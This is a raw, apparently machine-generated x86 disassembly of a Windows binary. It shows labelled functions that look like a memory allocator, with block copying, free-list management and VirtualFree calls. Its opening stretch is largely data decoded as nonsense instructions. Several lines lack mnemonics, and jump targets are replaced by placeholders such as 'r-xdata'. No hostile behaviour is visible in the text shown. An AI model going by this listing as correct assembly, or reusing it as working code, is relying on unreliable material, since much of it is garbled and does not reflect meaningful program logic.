sub_3a61004
add eax [ edi ]
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
adc [ esi + 0x61460503 ] ah
insb
jae r-xdata
imul ebp [ fs : esi + 0x61 ] 0x56c
add al 0x54
jb r-xdata
push es
jae r-xdata
lea eax [ eax ]
sub al 0x10
cmpsb [ esi ] [ edi ]
add eax [ edx ]
add al 0x43
push 0x17261
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi ] eax
dec ecx
outsb
je r-xdata
push 0x65
jb r-xdata
je r-xdata
jb r-xdata
add [ eax ] al
je r-xdata
arpl [ eax + ebx + 0x11 ] si
cmpsb [ esi ] [ edi ]
add eax [ edi ]
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add eax [ edi ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsb
movsb [ di ] [ si ]
adc [ esi + 0x570a0b03 ] ah
imul esp [ ebp + 0x53 ] 0x6e697274
mov ah 0x10
cmpsb [ esi ] [ edi ]
add ecx [ edi + eax ]
arpl [ esp + ecx + 0x11 ] si
push esi
popad
jb r-xdata
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pop eax
adc [ esi + 0x42040103 ] ah
jns r-xdata
sar bh 0x25
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
cmp [ ecx ] dl
cmpsb [ esi ] [ edi ]
add ecx [ edi ]
or cl [ ecx + 0x49 ]
outsb
je r-xdata
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx ] cl
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
and [ edx - 0x3f74fc50 ] cl
jmp [ rw-data ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
inc esi
test [ ecx ] edx
jb r-xdata
add [ eax ] al
cmp bh 0xff
inc eax
add [ ecx + edx ] cl
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
add eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x11
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
cmpsb [ esi ] [ edi ]
add ecx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12000040 ] cl
cmpsb [ esi ] [ edi ]
add edx [ ecx + 0x3a611 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc ah [ esi + 0xc03 ]
add al al
adc [ esi - 0x59ba37fd ] ah
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
enter 0xa645 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add [ eax ] al
imul ebp [ esi + 0x61 ] 0x56c
add esi [ ebp * 2 + 0x6d4003a6 ]
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x6d ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ ecx ]
push esp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] dl
cmpsb [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
sub_3a61092
call [ eax + r-xdata ]
or al [ esi ]
jae r-xdata
push 0x65
jb r-xdata
add [ eax ] al
je r-xdata
arpl [ eax + ebx + 0x11 ] si
cmpsb [ esi ] [ edi ]
add eax [ edi ]
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx + 0x11 ] si
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add eax [ edi ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsb
movsb [ di ] [ si ]
adc [ esi + 0x570a0b03 ] ah
imul esp [ ebp + 0x53 ] 0x6e697274
mov ah 0x10
cmpsb [ esi ] [ edi ]
add ecx [ edi + eax ]
push esi
popad
jb r-xdata
sar bh 0x25
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
cmp [ ecx ] dl
cmpsb [ esi ] [ edi ]
add ecx [ edi ]
or cl [ ecx + 0x49 ]
outsb
je r-xdata
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
outsb
je r-xdata
and [ edx - 0x3f74fc50 ] cl
jmp [ rw-data ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
inc esi
test [ ecx ] edx
jb r-xdata
add [ eax ] al
cmp bh 0xff
inc eax
add [ ecx + edx ] cl
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx ] cl
cmpsb [ esi ] [ edi ]
add eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0xa645 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
add ecx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12000040 ] cl
cmpsb [ esi ] [ edi ]
add edx [ ecx + 0x3a611 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc ah [ esi + 0xc03 ]
add al al
adc [ esi - 0x59ba37fd ] ah
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add esi [ ebp * 2 + 0x6d4003a6 ]
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x6d ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ ecx ]
push esp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] dl
cmpsb [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
sub_3a61163
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_3a64434
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_3a61185
adc [ gs : esi - 0x59ee90fd ] esp
add edi [ ecx + 0x11 ]
cmpsb [ esi ] [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
test [ ecx ] edx
cmpsb [ esi ] [ edi ]
add ecx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12000040 ] cl
cmpsb [ esi ] [ edi ]
add edx [ ecx + 0x3a611 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc ah [ esi + 0xc03 ]
add al al
adc [ esi - 0x59ba37fd ] ah
add esi [ ebp * 2 + 0x6d4003a6 ]
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x6d ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ ecx ]
push esp
dec ecx
outsb
je r-xdata
sar bh 0x25
jb r-xdata
and [ edx - 0x3f74fc50 ] cl
jmp [ rw-data ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_3a6147c
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov [ edx + 0xc ] ecx
mov ecx [ eax + 0x10 ]
mov [ edx + 0x10 ] ecx
mov ecx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
mov [ edx + 0x14 ] ecx
mov [ edx + 0x18 ] eax
retn
sub_3a614c8
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
mov ecx [ eax + 0x28 ]
mov [ edx + 0x28 ] ecx
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_3a614ec
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
mov ecx [ eax + 0x30 ]
mov [ edx + 0x30 ] ecx
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_3a61518
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
fild [ eax + 0x30 ]
mov ecx [ eax + 0x38 ]
mov [ edx + 0x38 ] ecx
fistp [ edx + 0x30 ]
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_3a61548
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
fild [ eax + 0x30 ]
fild [ eax + 0x38 ]
mov ecx [ eax + 0x40 ]
mov [ edx + 0x40 ] ecx
fistp [ edx + 0x38 ]
fistp [ edx + 0x30 ]
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_3a61580
sub ecx 0xc
add eax ecx
add edx ecx
neg ecx
jns r-xdata
fild [ ecx + eax ]
fistp [ ecx + edx ]
mov eax [ ecx + eax + 0x8 ]
mov [ ecx + edx + 0x8 ] eax
retn
fild [ ecx + eax ]
fild [ ecx + eax + 0x8 ]
fistp [ ecx + edx + 0x8 ]
fistp [ ecx + edx ]
add ecx 0x10
js r-xdata
sub_3a615cc
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
cmp ecx edx
mov [ ecx ] edx
mov [ edx + 0x4 ] ecx
je r-xdata
sub ecx rw-data
mov edx ecx
shr ecx 0x3
movzx edx dh
mov eax 0xfffffffe
rol eax cl
and [ edx * 4 + rw-data ] eax
jne r-xdata
retn
mov eax 0xfffffffe
mov ecx edx
rol eax cl
and [ rw-data ] eax
retn
sub_3a6160c
sub edx 0xb30
shr edx 0x8
sub edx 0x3ff
sbb ecx ecx
and edx ecx
add edx 0x3ff
lea ecx [ edx * 8 + rw-data ]
mov edx [ ecx + 0x4 ]
cmp edx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov [ edx ] eax
mov [ ecx + 0x4 ] eax
je r-xdata
sub ecx rw-data
mov edx ecx
shr ecx 0x3
movzx edx dh
mov eax 0x1
shl eax cl
or [ edx * 4 + rw-data ] eax
mov eax 0x1
mov ecx edx
shl eax cl
or [ rw-data ] eax
retn
retn
sub_3a6166c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
test [ eax - 0x4 ] 0x1
jne r-xdata
retn
mov edx 0xfffffff0
and edx [ eax - 0x4 ]
cmp edx 0xb30
jb r-xdata
or [ eax - 0x4 ] 0x8
mov edx [ rw-data ]
sub eax edx
mov ecx [ rw-data ]
sub eax ecx
add edx ecx
jmp r-xdata
call sub_3a615cc
mov eax [ rw-data ]
mov edx 0xfffffff0
and edx [ eax - 0x4 ]
retn
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
cmp edx 0xb30
jae sub_3a6160c
sub_3a616d8
push ebx
mov ebx eax
call sub_3a6166c
push 0x4
push 0x1000
push 0x13fff0
push 0x0
call sub_3a613c0
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
pop ebx
retn
mov edx [ rw-data ]
mov ecx eax
mov [ ecx ] rw-data
mov [ rw-data ] eax
mov [ ecx + 0x4 ] edx
mov [ edx ] eax
mov edx eax
add edx 0x13fff0
mov ecx edx
sub ecx 0x4
mov [ ecx ] 0x2
mov ecx 0x13ffe0
sub ecx ebx
mov [ rw-data ] ecx
sub edx ebx
mov eax edx
mov [ rw-data ] eax
or ebx 0x2
mov edx eax
sub edx 0x4
mov [ edx ] ebx
pop ebx
retn
sub_3a61750
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp r-xdata
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_3a61440
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call sub_3a613d0
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_3a61440
test al al
je r-xdata
push 0xa
call sub_3a613d0
sub_3a618a0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov edi eax
mov eax edi
sub eax 0x4
mov eax [ eax ]
mov ebx eax
and ebx 0xfffffff0
sub ebx 0x14
cmp ebx esi
jae r-xdata
shr ebx 0x1
cmp esi ebx
jb r-xdata
mov edx ebx
shr edx 0x2
add edx ebx
cmp edx esi
jbe r-xdata
mov eax esi
call sub_3a619ec
mov ebx eax
test ebx ebx
je r-xdata
mov ebx edi
sub edi 0x10
mov [ edi + 0x8 ] esi
jmp r-xdata
mov ebp esi
mov ebp edx
jmp r-xdata
mov eax ebx
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp esi 0x40a2c
jbe r-xdata
mov eax ebp
call sub_3a619ec
mov ebx eax
test ebx ebx
je r-xdata
and [ esp + 0x10 ] 0xffff0000
mov edx esi
sub edx ebx
mov eax [ esp + 0x10 ]
cmp edx eax
jae r-xdata
mov edx edi
sub edx 0x10
and eax 0xfffffff0
add edx eax
mov [ esp ] edx
push 0x1c
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
call sub_3a61354
cmp [ esp + 0x14 ] 0x10000
jne r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_3a615b0
mov eax edi
call sub_3a61d70
mov eax edi
sub eax 0x10
mov [ eax + 0x8 ] esi
cmp ebp 0x40a2c
jbe r-xdata
mov edx ebp
sub edx ebx
add edx 0x10000
dec edx
and edx 0xffff0000
mov ebx edx
cmp eax ebx
jae r-xdata
mov eax edi
sub eax 0x10
mov eax [ eax + 0x8 ]
mov edx ebx
mov ecx edi
xchg ecx eax
call sub_3a61580
mov eax edi
call sub_3a61d70
jmp r-xdata
mov eax ebx
sub eax 0x10
mov [ eax + 0x8 ] esi
push 0x4
push 0x2000
push ebx
mov eax [ esp + 0xc ]
push eax
call sub_3a613c0
test eax eax
je r-xdata
mov ebx eax
push 0x4
push 0x1000
push ebx
mov eax [ esp + 0xc ]
push eax
call sub_3a613c0
test eax eax
je r-xdata
mov eax edi
sub eax 0x10
mov [ eax + 0x8 ] esi
mov edx eax
add ebx [ edx + 0xc ]
or ebx 0x8
mov [ edx + 0xc ] ebx
mov ebx edi
jmp r-xdata
sub_3a619ec
lea edx [ eax + 0x3 ]
shr edx 0x3
cmp eax 0xa2c
push ebx
mov cl [ rw-data ]
ja r-xdata
cmp eax 0x40a2c
ja r-xdata
test cl cl
movzx eax [ edx + rw-data ]
lea ebx [ eax * 8 + rw-data ]
jne r-xdata
pop ebx
test eax eax
jns r-xdata
lea ebx [ eax + 0xd3 ]
and ebx 0xffffff00
add ebx 0x30
test cl cl
jne r-xdata
mov eax 0x100
[ ebx ] ah
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + 0x8 ]
mov ecx 0xfffffff8
cmp edx ebx
je r-xdata
push ebx
push esi
push edi
push ebp
mov ebp eax
lea esi [ ebp + 0x10010 ]
dec esi
add esi 0x4
and esi 0xffff0000
push 0x4
push 0x101000
push esi
push 0x0
call sub_3a613c0
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
retn
mov eax 0x100
[ rw-data ] ah
je r-xdata
lea edx [ ebx - 0xb30 ]
mov ecx edx
shr edx 0xd
shr ecx 0x8
mov eax 0xffffffff
shl eax cl
and eax [ edx * 4 + rw-data ]
je r-xdata
add ebx 0x20
mov eax 0x100
[ ebx ] ah
je r-xdata
mov edx [ ebx + 0x10 ]
movzx ecx [ ebx + 0x2 ]
add ecx eax
cmp eax [ ebx + 0xc ]
ja r-xdata
add [ edx + 0xc ] 0x1
and ecx [ eax - 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ eax - 0x4 ] edx
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
mov [ edi + 0x8 ] ebp
or esi 0x4
mov [ edi + 0xc ] esi
call sub_3a61750
mov eax [ rw-data ]
mov [ edi ] rw-data
mov [ rw-data ] ebx
mov [ edi + 0x4 ] eax
mov [ eax ] ebx
mov [ rw-data ] 0x0
add ebx 0x10
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0xfffffffe
mov ecx edx
shl eax cl
and eax [ rw-data ]
je r-xdata
and ecx 0xffffffe0
bsf eax eax
or ecx eax
jmp r-xdata
add ebx 0x20
mov eax 0x100
[ ebx ] ah
je r-xdata
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
add [ edx + 0xc ] 0x1
mov [ ebx + 0x8 ] ecx
mov [ ebx ] 0x0
mov [ eax - 0x4 ] edx
pop ebx
retn
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x14 ] ebx
mov [ ebx + 0x4 ] ecx
mov [ ebx ] 0x0
pop ebx
retn
mov [ ebx ] 0x0
pop ebx
retn
push 0x0
call sub_3a613d0
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov ecx [ rw-data ]
sub ecx ebx
jb r-xdata
bsf edx eax
mov eax [ edx * 4 + rw-data ]
bsf ecx eax
mov eax edx
shl eax 0x5
or ecx eax
jmp r-xdata
push esi
push edi
lea edi [ ecx * 8 + rw-data ]
mov esi [ edi + 0x4 ]
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
mov [ eax ] edi
cmp edi eax
jne r-xdata
sub ebx 0x40
pause
cmp [ rw-data ] 0x0
jne r-xdata
movsx esi [ ebx + 0x1 ]
and esi [ rw-data ]
je r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
push 0xa
call sub_3a613d0
jmp r-xdata
mov eax ebx
call sub_3a616d8
mov eax [ rw-data ]
sub eax ebx
mov [ rw-data ] eax
mov [ rw-data ] ecx
or ebx 0x2
mov [ eax - 0x4 ] ebx
jmp r-xdata
mov edi 0xfffffff0
and edi [ esi - 0x4 ]
mov edx edi
sub edx ebx
je r-xdata
mov eax 0xfffffffe
rol eax cl
and [ edx * 4 + rw-data ] eax
jne r-xdata
push 0x0
call sub_3a613d0
mov eax 0x100
[ ebx ] ah
je r-xdata
movzx ecx [ ebx + 0x18 ]
mov edi [ rw-data ]
cmp edi ecx
jb r-xdata
bsf eax esi
lea esi [ eax * 8 ]
mov ecx [ eax * 4 + rw-data ]
bsf ecx ecx
lea ecx [ ecx + esi * 4 ]
lea edi [ ecx * 8 + rw-data ]
mov esi [ edi + 0x4 ]
mov edx [ esi + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ edx ] edi
cmp edi edx
jne r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] 0x0
pop ebx
retn
and [ edi + esi - 0x4 ] 0xf7
lea eax [ ebx + esi ]
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
cmp edx 0xb30
jb r-xdata
btr [ rw-data ] edx
push 0xa
call sub_3a613d0
jmp r-xdata
movzx eax [ ebx + 0x1a ]
mov edi eax
call sub_3a616d8
mov esi eax
test eax eax
jne r-xdata
mov esi [ rw-data ]
movzx ecx [ ebx + 0x1a ]
lea edx [ ecx + 0xb30 ]
cmp edi edx
jb r-xdata
mov edi 0xfffffff0
and edi [ esi - 0x4 ]
cmp edi 0x10a60
jb r-xdata
mov edx 0xfffffffe
rol edx cl
and [ eax * 4 + rw-data ] edx
jne r-xdata
push 0x0
call sub_3a613d0
mov eax 0x100
[ rw-data ] ah
je r-xdata
lea ecx [ ebx + 0x2 ]
mov [ esi - 0x4 ] ecx
mov [ rw-data ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_3a6160c
jmp r-xdata
lea ecx [ edi + 0x6 ]
mov [ esi - 0x4 ] ecx
xor eax eax
mov [ rw-data ] al
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] 0x1
mov [ ebx + 0x10 ] esi
lea eax [ esi + 0x20 ]
movzx ecx [ ebx + 0x2 ]
lea edx [ ecx + eax ]
mov [ ebx + 0x8 ] edx
add edi esi
sub edi ecx
mov [ ebx + 0xc ] edi
mov [ ebx ] 0x0
mov [ eax - 0x4 ] esi
pop edi
pop esi
pop ebx
retn
mov [ rw-data ] al
mov [ ebx ] al
pop edi
pop esi
pop ebx
retn
sub esi edi
sub [ rw-data ] edi
mov [ rw-data ] esi
jmp r-xdata
mov edi ecx
and [ edi + esi - 0x4 ] 0xf7
mov edx edi
movzx edi [ ebx + 0x1a ]
sub edx edi
lea eax [ edi + esi ]
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
call sub_3a6160c
jmp r-xdata
btr [ rw-data ] eax
push 0xa
call sub_3a613d0
jmp r-xdata
sub_3a61d70
mov edx [ eax - 0x4 ]
test dl 0x7
mov ecx eax
push ebx
mov bl [ rw-data ]
jne r-xdata
test dl 0x5
jne r-xdata
test bl bl
mov ebx [ edx ]
jne r-xdata
pop ebx
test dl 0x3
je r-xdata
and edx 0xfffffff0
test bl bl
mov ebx edx
push esi
mov esi eax
jne r-xdata
mov eax 0x100
[ ebx ] ah
je r-xdata
sub [ edx + 0xc ] 0x1
mov eax [ edx + 0x8 ]
je r-xdata
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov esi eax
sub esi 0x10
call sub_3a61750
mov eax esi
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0xc ]
test dl 0x8
jne r-xdata
mov eax 0xffffffff
retn
mov eax 0x100
[ rw-data ] ah
je r-xdata
test [ ebx + esi - 0x4 ] 0x1
mov ecx [ ebx + esi - 0x4 ]
jne r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
test eax eax
je r-xdata
test eax eax
mov [ edx + 0x8 ] ecx
lea eax [ eax + 0x1 ]
mov [ ecx - 0x4 ] eax
je r-xdata
mov ebx esi
mov ebp edx
and ebp 0xfffffff0
xor edi edi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
je r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebx + esi ]
and ecx 0xfffffff0
add ebx ecx
cmp ecx 0xb30
jb r-xdata
or ecx 0x8
mov [ ebx + esi - 0x4 ] ecx
push ecx
push edx
push 0x0
call sub_3a613d0
pop edx
pop ecx
mov eax 0x100
[ ebx ] ah
je r-xdata
mov [ ebx + 0xc ] eax
mov eax [ edx + 0x14 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x14 ] eax
xor eax eax
cmp [ ebx + 0x10 ] edx
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edx + 0x14 ] ebx
mov [ edx + 0x4 ] ecx
mov [ ecx + 0x14 ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx ] 0x0
xor eax eax
pop ebx
retn
xor eax eax
mov [ ebx ] al
pop ebx
retn
mov esi [ esp + 0x14 ]
cmp ebp esi
jbe r-xdata
or edi 0xffffffff
jmp r-xdata
or edi 0xffffffff
jmp r-xdata
xor edi edi
jmp r-xdata
push 0x0
call sub_3a613d0
mov eax 0x100
[ rw-data ] ah
je r-xdata
test [ esi - 0x4 ] 0x8
jne r-xdata
call sub_3a615cc
jmp r-xdata
mov ecx [ esi - 0x8 ]
sub esi ecx
add ebx ecx
cmp ecx 0xb30
jb r-xdata
cmp ebx 0x13ffe0
je r-xdata
push ecx
push edx
push 0xa
call sub_3a613d0
pop edx
pop ecx
jmp r-xdata
mov [ ebx ] al
mov eax edx
mov edx [ edx - 0x4 ]
mov bl [ rw-data ]
jmp r-xdata
test edi edi
jne r-xdata
sub ebp esi
add ebx esi
jmp r-xdata
push 0xa
call sub_3a613d0
jmp r-xdata
mov eax esi
call sub_3a615cc
jmp r-xdata
cmp [ rw-data ] 0x13ffe0
jne r-xdata
lea eax [ ebx + 0x3 ]
mov [ esi - 0x4 ] eax
mov [ ebx + esi - 0x8 ] ebx
mov eax esi
mov edx ebx
call sub_3a6160c
mov [ rw-data ] 0x0
xor eax eax
pop esi
pop ebx
retn
mov [ rw-data ] 0x0
mov eax edi
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp ]
mov [ eax ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
mov [ eax + 0x4 ] edx
push 0x1c
lea eax [ esp + 0xc ]
push eax
push ebx
call sub_3a61354
push 0x8000
push 0x0
push ebx
call VirtualFree
test eax eax
jne r-xdata
lea ebx [ esi + 0x13ffe0 ]
call sub_3a6166c
mov [ ebx - 0x4 ] 0x2
mov [ rw-data ] 0x13ffe0
mov [ rw-data ] ebx
mov [ rw-data ] 0x0
xor eax eax
pop esi
pop ebx
retn
sub esi 0x10
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ edx ] eax
mov [ rw-data ] 0x0
push 0x8000
push 0x0
push esi
call VirtualFree
cmp eax 0x1
sbb eax eax
pop esi
pop ebx
retn
sub_3a61f68
mov ecx [ eax - 0x4 ]
test cl 0x7
push ebx
push esi
mov esi eax
jne r-xdata
test cl 0x5
jne r-xdata
